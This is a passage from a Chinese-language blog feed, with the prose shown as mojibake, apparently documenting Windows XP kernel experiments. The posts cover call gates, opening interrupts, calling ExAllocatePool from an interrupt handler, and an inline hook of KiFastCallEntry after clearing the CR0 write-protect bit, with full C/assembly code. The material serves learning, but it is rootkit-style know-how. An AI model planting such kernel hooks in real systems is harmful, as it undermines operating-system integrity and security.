class="number">1</span><span class="comment">////ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">        <span class="type">int</span> <span class="number">0x21</span></span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,ReadMem(<span class="number">0x8003f00c</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x&quot;</span>,AllocMem(<span class="number">0x10</span>));</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/31/Windows-Kernel-Experiment-system-call/image-20230531153550640.png" alt="image-20230531153550640"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:InlineHook</title>
      <link href="/2023/05/29/Windows-Kernel-Experiment-InlineHook/"/>
      <url>/2023/05/29/Windows-Kernel-Experiment-InlineHook/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-InlineHook"><a href="#Windowså†…æ ¸å®éªŒ-InlineHook" class="headerlink" title="Windowså†…æ ¸å®éªŒ:InlineHook"></a>Windowså†…æ ¸å®éªŒ:InlineHook</h1><p>hookçš„è¯ï¼Œæˆ‘ä»¬è‚¯å®šè¦æŠŠä»£ç hookåˆ°å†…æ ¸ç©ºé—´é‡Œï¼Œæ‰€ä»¥å¿…é¡»è¦æŠŠä»£ç å†™åˆ°å†…æ ¸é‡Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ExAllocatePoolåˆ†é…ä¸€å—å†…å­˜æˆ–è€…åœ¨å†…æ ¸é‡Œæ‰¾ä¸€å—å®‰å…¨çš„å†…æ ¸ä¸ä¼šç”¨åˆ°çš„å†…å­˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dq @gdtr l100</span></span><br><span class="line">8003f000  00000000`00000000 00cf9b00`0000ffff</span><br><span class="line">8003f010  00cf9300`0000ffff 00cffb00`0000ffff</span><br><span class="line">8003f020  00cff300`0000ffff 80008b04`200020ab</span><br><span class="line">8003f030  ffc093df`f0000001 0040f300`00000fff</span><br><span class="line">......</span><br><span class="line">8003f110  f840933d`5400ffff 00000000`8003f120</span><br><span class="line">8003f120  00000000`8003f128 00000000`8003f130</span><br><span class="line">8003f130  00000000`8003f138 00000000`8003f140</span><br><span class="line">8003f140  00000000`8003f148 00000000`8003f150</span><br><span class="line">8003f150  00000000`8003f158 00000000`8003f160</span><br><span class="line">8003f160  00000000`8003f168 00000000`8003f170</span><br><span class="line">8003f170  00000000`8003f178 00000000`8003f180</span><br><span class="line">8003f180  00000000`8003f188 00000000`8003f190</span><br><span class="line">8003f190  00000000`8003f198 00000000`8003f1a0</span><br><span class="line">8003f1a0  00000000`8003f1a8 00000000`8003f1b0</span><br><span class="line">8003f1b0  00000000`8003f1b8 00000000`8003f1c0</span><br><span class="line">8003f1c0  00000000`8003f1c8 00000000`8003f1d0</span><br><span class="line">8003f1d0  00000000`8003f1d8 00000000`8003f1e0</span><br><span class="line">8003f1e0  00000000`8003f1e8 00000000`8003f1f0</span><br><span class="line">8003f1f0  00000000`8003f1f8 00000000`8003f200</span><br><span class="line">8003f200  00000000`8003f208 00000000`8003f210</span><br><span class="line">8003f210  00000000`8003f218 00000000`8003f220</span><br><span class="line">8003f220  00000000`8003f228 00000000`8003f230</span><br><span class="line">8003f230  00000000`8003f238 00000000`8003f240</span><br><span class="line">8003f240  00000000`8003f248 00000000`8003f250</span><br><span class="line">8003f250  00000000`8003f258 00000000`8003f260</span><br><span class="line">.........</span><br></pre></td></tr></table></figure><p>gdtè¡¨é‡Œå…¶å®æœ‰å¥½å¤šæ²¡æœ‰ç”¨çš„ä½ç½®ï¼Œå®Œå…¨æ»¡è¶³æˆ‘ä»¬å†™å°ä»£ç hookçš„éœ€æ±‚</p><p>hookçš„å‡½æ•°_KiFastCallEntryï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¢«é¢‘ç¹è°ƒç”¨ï¼Œ3ç¯åˆ°0ç¯çš„éœ€æ±‚æ˜¯å¾ˆé¢‘ç¹çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:80541510                               _KiFastCallEntry proc near              ; DATA XREF: KiLoadFastSyscallMachineSpecificRegisters(x)+24â†‘o</span><br><span class="line">.text:80541510</span><br><span class="line">.text:80541510 B9 23 00 00 00                mov     ecx, 23h ; &#x27;#&#x27;</span><br><span class="line">.text:80541515 6A 30                         push    30h ; &#x27;0&#x27;</span><br><span class="line">.text:80541517 0F A1                         pop     fs</span><br><span class="line">.text:80541519 8E D9                         mov     ds, ecx</span><br><span class="line">.text:8054151B 8E C1                         mov     es, ecx</span><br><span class="line">.text:8054151D 64 8B 0D 40 00 00 00          mov     ecx, large fs:40h</span><br><span class="line">.text:80541524 8B 61 04                      mov     esp, [ecx+4]</span><br><span class="line">.text:80541527 6A 23                         push    23h ; &#x27;#&#x27;</span><br><span class="line">.text:80541529 52                            push    edx</span><br><span class="line">.text:8054152A 9C                            pushf</span><br></pre></td></tr></table></figure><p>hookåˆ°8054151Då¤„ï¼Œè¿™é‡Œecxå¯„å­˜å™¨ä¼šå†æ¬¡è¢«èµ‹å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ecxå¯„å­˜å™¨å»é¿å…jmpåç§»åœ°å€çš„è®¡ç®—(è†œæ‹œå‘¨å£‘orz)</p><p>æ³¨å…¥ä»£ç åœ°å€é€‰æ‹©åˆ°gdtè¡¨8003f130å¤„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">JmpTarget</span><span class="params">()</span>;</span><br><span class="line"><span class="type">char</span>* p = (<span class="type">char</span> *)<span class="number">0x8003f130</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++) &#123;</span><br><span class="line">        <span class="comment">//è£¸å‡½æ•°é‡Œå°½é‡ä¸ç”¨å±€éƒ¨å˜é‡ï¼Œå› ä¸ºæ²¡æœ‰æ ˆå¸§</span></span><br><span class="line">        <span class="comment">//è¯•äº†ä¸€ä¸‹å¦‚æœè¿™é‡Œç”¨size_t i=0;çš„è¯ï¼Œä½¿ç”¨äº†å¯„å­˜å™¨ediè®¡æ•°ï¼Œä½†æ˜¯è¿˜æ˜¯åœ¨ç”¨å…¨å±€å˜é‡ä¿é™©</span></span><br><span class="line">        *p = ((<span class="type">char</span>*)JmpTarget)[i];</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        cli <span class="comment">//è¿™é‡Œå…³ä¸­æ–­æ˜¯ä¸ºäº†é˜²æ­¢è¿˜æ²¡æŠŠfså¯„å­˜å™¨æ¢å¤æ—¶ï¼Œè¢«æ—¶é’Ÿä¸­æ–­è°ƒåº¦èµ°ï¼Œå¯¼è‡´å…¶ä»–ç¨‹åºç”¨äº†ä¸æ­£ç¡®çš„fså¯„å­˜å™¨è€Œè“å±</span></span><br><span class="line">        push <span class="number">0x3B</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) JmpTarget() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov ecx, <span class="number">0x23</span></span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        mov ds, cx</span><br><span class="line">        mov es, cx</span><br><span class="line">        mov ecx,<span class="number">0x8054151D</span></span><br><span class="line">        jmp ecx</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; u 0x8003f130 l30</span><br><span class="line">8003f130 b923000000      mov     ecx,23h</span><br><span class="line">8003f135 6a30            push    30h</span><br><span class="line">8003f137 0fa1            pop     fs</span><br><span class="line">8003f139 668ed9          mov     ds,cx</span><br><span class="line">8003f13c 668ec1          mov     es,cx</span><br><span class="line">8003f13f b91d155480      mov     ecx,offset nt!KiFastCallEntry+0xd (8054151d)</span><br><span class="line">8003f144 ffe1            jmp     ecx</span><br></pre></td></tr></table></figure><p>80541510è¿™ä¸ªåœ°å€æ˜¯ä¸å¯å†™çš„ï¼ŒCR0[16] WPï¼ˆWrite Protectï¼‰ å†™ä¿æŠ¤ä½ï¼Œä¸º1æ—¶ï¼Œç¦æ­¢å†…æ ¸çº§ä»£ç å†™ç”¨æˆ·çº§çš„åªè¯»å†…å­˜é¡µï¼›ä¸º0æ—¶å…è®¸</p><p>åç§»&#x3D;8003f130-80541515&#x3D;FFAF DC1B</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr0</span><br><span class="line">        and eax, not <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line"></span><br><span class="line">        <span class="comment">//E9 1B DC AF FF</span></span><br><span class="line">        mov al, <span class="number">0xe9</span></span><br><span class="line">        mov ds : [<span class="number">0x80541510</span>] , al</span><br><span class="line">        mov dword ptr ds : [<span class="number">0x80541511</span>],<span class="number">0xFFAFDC1B</span></span><br><span class="line"></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        or eax, <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™æ ·å†™ä»£ç å»æ”¹_KiFastCallEntryå…¥å£ç‚¹ä»£ç ä¸»è¦æ˜¯å› ä¸ºæˆ‘ä»¬æ˜¯å•æ ¸å•çº¿ç¨‹çš„æœºå™¨</p><p>å¦‚æœæ˜¯å¤šæ ¸å¤šçº¿ç¨‹ï¼Œæ˜¾ç„¶ä¼šæœ‰å¹¶å‘é—®é¢˜ï¼Œæ¯”å¦‚æˆ‘cpu1åœ¨æ”¹çš„è¿‡ç¨‹ä¸­è¿˜æ²¡æ”¹å®Œï¼Œæ­¤æ—¶è°ƒåº¦åˆ°cpu2æ‰§è¡Œå¯èƒ½æ‰§è¡Œåˆ°æˆ‘ä»¬è¿˜æ²¡æ”¹å®Œçš„ä»£ç é€ æˆè“å±ï¼Œéœ€è¦åŠ æŠŠé”</p></blockquote><p>okäº†</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">u 80541510</span></span><br><span class="line">nt!KiFastCallEntry:</span><br><span class="line">80541510 e91bdcafff      jmp     8003f130</span><br><span class="line">80541515 6a30            push    30h</span><br><span class="line">80541517 0fa1            pop     fs</span><br><span class="line">80541519 8ed9            mov     ds,cx</span><br><span class="line">8054151b 8ec1            mov     es,cx</span><br><span class="line">8054151d 648b0d40000000  mov     ecx,dword ptr fs:[40h]</span><br><span class="line">80541524 8b6104          mov     esp,dword ptr [ecx+4]</span><br><span class="line">80541527 6a23            push    23h</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">u 8003f130</span></span><br><span class="line">8003f130 b923000000      mov     ecx,23h</span><br><span class="line">8003f135 6a30            push    30h</span><br><span class="line">8003f137 0fa1            pop     fs</span><br><span class="line">8003f139 668ed9          mov     ds,cx</span><br><span class="line">8003f13c 668ec1          mov     es,cx</span><br><span class="line">8003f13f b91d155480      mov     ecx,offset nt!KiFastCallEntry+0xd (8054151d)</span><br><span class="line">8003f144 ffe1            jmp     ecx</span><br><span class="line">8003f146 cc              int     3</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥æŠŠå¯„å­˜å™¨éƒ½ä¿å­˜ä¸€ä¸‹ç„¶åå†™è‡ªå·±çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) JmpTarget() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad</span><br><span class="line">        pushfd</span><br><span class="line"> +++++your code++++++</span><br><span class="line">        popfd</span><br><span class="line">        popad</span><br><span class="line">        mov ecx, <span class="number">0x23</span></span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        mov ds, cx</span><br><span class="line">        mov es, cx</span><br><span class="line">        mov ecx, <span class="number">0x8054151D</span></span><br><span class="line">        jmp ecx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:å¼€ä¸­æ–­&amp;&amp;APIè°ƒç”¨</title>
      <link href="/2023/05/29/Windows-Kernel-Experiment-Open-interrupt-API-call/"/>
      <url>/2023/05/29/Windows-Kernel-Experiment-Open-interrupt-API-call/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-å¼€ä¸­æ–­-amp-amp-APIè°ƒç”¨"><a href="#Windowså†…æ ¸å®éªŒ-å¼€ä¸­æ–­-amp-amp-APIè°ƒç”¨" class="headerlink" title="Windowså†…æ ¸å®éªŒ:å¼€ä¸­æ–­&amp;&amp;APIè°ƒç”¨"></a>Windowså†…æ ¸å®éªŒ:å¼€ä¸­æ–­&amp;&amp;APIè°ƒç”¨</h1><h2 id="å¼€ä¸­æ–­"><a href="#å¼€ä¸­æ–­" class="headerlink" title="å¼€ä¸­æ–­"></a>å¼€ä¸­æ–­</h2><p>å‰é¢éªŒè¯è¿‡ä¸­æ–­åeflagså¯„å­˜å™¨çš„ç¬¬ä¹ä½IFå˜ä¸º0ï¼Œå…³ä¸­æ–­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">    label:</span><br><span class="line">        jmp label</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æ—¶é’Ÿä¸­æ–­æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œè¿™æ®µä»£ç ä¸€å®šæ˜¯å¡æ­»çš„ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥å¼€ä¸­æ–­å‘¢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        sti</span><br><span class="line">    label:</span><br><span class="line">        jmp label</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æ²¡æœ‰å¡æ­»ï¼Œä½†æ˜¯å´©æºƒäº†</p><p>è¿™æ˜¯å› ä¸ºå†…æ ¸ç¯å¢ƒä¸å¯¹</p><p>_KiFastCallEntryå‡½æ•°ä¸»è¦ç”¨åœ¨ring3åˆ°ring0çš„ç‰¹æƒçº§å˜æ¢ï¼Œä¸ºè¿›å…¥å’Œè¿”å›å†…æ ¸æ¨¡å¼åšå‡†å¤‡ï¼Œä»–åœ¨å¼€ä¸­æ–­å‰åšäº†ä¸€äº›å‡†å¤‡å·¥ä½œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">text:00469510                               _KiFastCallEntry proc near              ; DATA XREF: KiLoadFastSyscallMachineSpecificRegisters(x)+24â†‘o</span><br><span class="line">.text:00469510                                                                       ; _KiTrap01+74â†“o</span><br><span class="line">.text:00469510</span><br><span class="line">.text:00469510                               var_B= byte ptr -0Bh</span><br><span class="line">.text:00469510</span><br><span class="line">.text:00469510                               ; FUNCTION CHUNK AT .text:004694DD SIZE 00000026 BYTES</span><br><span class="line">.text:00469510                               ; FUNCTION CHUNK AT .text:004697B0 SIZE 00000014 BYTES</span><br><span class="line">.text:00469510</span><br><span class="line">.text:00469510 B9 23 00 00 00                mov     ecx, 23h ; &#x27;#&#x27;</span><br><span class="line">.text:00469515 6A 30                         push    30h ; &#x27;0&#x27;</span><br><span class="line">.text:00469517 0F A1                         pop     fs</span><br><span class="line">.text:00469519 8E D9                         mov     ds, ecx</span><br><span class="line">.text:0046951B 8E C1                         mov     es, ecx</span><br><span class="line">.text:0046951D 64 8B 0D 40 00 00 00          mov     ecx, large fs:40h</span><br><span class="line">.text:00469524 8B 61 04                      mov     esp, [ecx+4]</span><br><span class="line">.text:00469527 6A 23                         push    23h ; &#x27;#&#x27;</span><br><span class="line">.text:00469529 52                            push    edx</span><br><span class="line">.text:0046952A 9C                            pushf</span><br></pre></td></tr></table></figure><p>æœ€ä¸»è¦çš„æ—¶fså¯„å­˜å™¨,å…¶ä½™çš„ds es å’Œç”¨æˆ·æ€æ˜¯ä¸€æ ·çš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00469515</span> <span class="number">6</span>A <span class="number">30</span>                         push    <span class="number">30</span>h ; <span class="string">&#x27;0&#x27;</span></span><br><span class="line">.text:<span class="number">00469517</span> <span class="number">0F</span> A1                         pop     fs</span><br></pre></td></tr></table></figure><p>fså¯„å­˜å™¨åœ¨å†…æ ¸æ¨¡å¼ä¸‹æŒ‡å‘å¤„ç†å™¨æ§åˆ¶åŒº(KPCR)ï¼Œé€‰æ‹©å­ä¸º30hã€‚KPCRä¸­å­˜å‚¨äº†CPUæœ¬èº«è¦ç”¨çš„ä¸€äº›é‡è¦æ•°æ®ï¼šGDTã€IDTä»¥åŠçº¿ç¨‹ç›¸å…³çš„ä¸€äº›ä¿¡æ¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">    label:</span><br><span class="line">        jmp label</span><br><span class="line">           push <span class="number">0x3B</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ï¼Œæ—¶é’Ÿä¸­æ–­å¯ä»¥å·¥ä½œäº†ï¼Œä½†æ˜¯è¿›ç¨‹æ˜¯æ€ä¸æ­»çš„ï¼Œå…³æœºä¹Ÿæ˜¯å…³ä¸äº†çš„ï¼Œè°ƒè¯•å™¨æ¥ç®¡å»æ”¹æ‰è¿™ä¸ªå¾ªç¯å°±å¯ä»¥</p><blockquote><p>æœ€åè¿”å›3ç¯æ—¶è¦æŠŠfså†æ¢å¤</p></blockquote><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>ç›®å‰çš„æ‰€å­¦çŸ¥è¯†è¿˜ä¸èƒ½è§£é‡Šå¤ªæ¸…æ¥šKPCRï¼Œå†ç­‰ç­‰</p><h2 id="APIè°ƒç”¨"><a href="#APIè°ƒç”¨" class="headerlink" title="APIè°ƒç”¨"></a>APIè°ƒç”¨</h2><p>æœ‰äº†ä¸Šé¢çš„åŸºç¡€ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸å¤ªå®‰å…¨çš„è°ƒç”¨å†…æ ¸å‡½æ•°äº†(ä¸å¤ªå®‰å…¨æ˜¯å› ä¸ºæˆ‘ä»¬çš„å†…æ ¸ç¯å¢ƒæ„å»ºä¸å¤Ÿå®Œæ•´ï¼Œåªæ„å»ºäº†æœ€åŸºç¡€çš„fså¯„å­˜å™¨)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">PVOID</span> <span class="params">(__stdcall *EX_AllOCATEPOOl)</span><span class="params">(DWORD PoolType, SIZE_T NumberOfBytes)</span>;</span><br><span class="line">PVOID g_pointer;</span><br><span class="line">EX_AllOCATEPOOl ExAllocatePool=(EX_AllOCATEPOOl)<span class="number">0x80536FEC</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">    &#125;</span><br><span class="line">    g_pointer=ExAllocatePool(<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x3B</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>, g_pointer);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ExAllocatePoolæ˜¯é©±åŠ¨ntkrnplpaé‡Œä¸€ä¸ªå¯¼å‡ºå‡½æ•°,ç”¨äºåœ¨å†…æ ¸æ¨¡å¼ä¸‹åˆ†é…å†…å­˜ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PVOID <span class="title function_">ExAllocatePool</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_ POOL_TYPE PoolType,</span></span><br><span class="line"><span class="params">  _In_ SIZE_T    NumberOfBytes</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li><code>PoolType</code>ï¼šæŒ‡å®šå†…å­˜æ± çš„ç±»å‹ï¼Œå¯ä»¥æ˜¯<code>NonPagedPool</code>æˆ–<code>PagedPool</code>ã€‚<code>NonPagedPool</code>æ˜¯éåˆ†é¡µæ± ï¼Œç”¨äºåˆ†é…ä¸èƒ½äº¤æ¢åˆ°ç£ç›˜çš„å†…å­˜ï¼›<code>PagedPool</code>æ˜¯åˆ†é¡µæ± ï¼Œç”¨äºåˆ†é…å¯ä»¥äº¤æ¢åˆ°ç£ç›˜çš„å†…å­˜ã€‚</li><li><code>NumberOfBytes</code>ï¼šæŒ‡å®šè¦åˆ†é…çš„å†…å­˜å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</li></ul><p><img src="/2023/05/29/Windows-Kernel-Experiment-Open-interrupt-API-call/image-20230529210100412.png" alt="image-20230529210100412"></p><p><img src="/2023/05/29/Windows-Kernel-Experiment-Open-interrupt-API-call/image-20230529211226588.png" alt="image-20230529211226588"></p><p>è¿™æ ·æˆ‘ä»¬å°±æœ‰äº†å†…æ ¸æ³¨å…¥çš„åŸºç¡€</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:ä¸­æ–­ç°åœº(Interrupt Handling)</title>
      <link href="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/"/>
      <url>/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-ä¸­æ–­ç°åœº-Interrupt-Handling"><a href="#Windowså†…æ ¸å®éªŒ-ä¸­æ–­ç°åœº-Interrupt-Handling" class="headerlink" title="Windowså†…æ ¸å®éªŒ:ä¸­æ–­ç°åœº(Interrupt Handling)"></a>Windowså†…æ ¸å®éªŒ:ä¸­æ–­ç°åœº(Interrupt Handling)</h1><p><strong>!!!windbgè°ƒè¯•å™¨ç»™æˆ‘ä»¬çš„ä¿¡æ¯å¯èƒ½æ˜¯ä¸å‡†ç¡®çš„ï¼Œä¸­æ–­æ–­ä¸‹æ¥åï¼Œè°ƒè¯•å­ç³»ç»Ÿéœ€è¦é€šè¿‡ä¸²å£å‘é€ç»™è°ƒè¯•å™¨ï¼Œè¿™æœŸé—´æœ‰äº›å¯„å­˜å™¨çš„å€¼å°±å˜äº†ï¼Œæ¯”è¾ƒå‡†ç¡®çš„æ–¹æ³•å°±æ˜¯åœ¨r0é‡Œå†™æ±‡ç¼–ï¼Œè¿”å›ç»™æˆ‘ä»¬æ•°æ®</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD g_eax[<span class="number">2</span>], g_ebx[<span class="number">2</span>], g_ecx[<span class="number">2</span>], g_edx[<span class="number">2</span>], g_esi[<span class="number">2</span>], g_edi[<span class="number">2</span>], g_esp[<span class="number">2</span>], g_ebp[<span class="number">2</span>];</span><br><span class="line">WORD g_cs[<span class="number">2</span>], g_ds[<span class="number">2</span>], g_es[<span class="number">2</span>], g_fs[<span class="number">2</span>], g_gs[<span class="number">2</span>], g_ss[<span class="number">2</span>];</span><br><span class="line">DWORD g_eflags,g_eflags0;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushfd</span><br><span class="line">        pop[g_eflags]</span><br><span class="line">        mov[g_eax + <span class="number">4</span>], eax</span><br><span class="line">        mov[g_ebx + <span class="number">4</span>], ebx</span><br><span class="line">        mov[g_ecx + <span class="number">4</span>], ecx</span><br><span class="line">        mov[g_edx + <span class="number">4</span>], edx</span><br><span class="line">        mov[g_esi + <span class="number">4</span>], esi</span><br><span class="line">        mov[g_edi + <span class="number">4</span>], edi</span><br><span class="line">        mov[g_esp + <span class="number">4</span>], esp</span><br><span class="line">        mov[g_ebp + <span 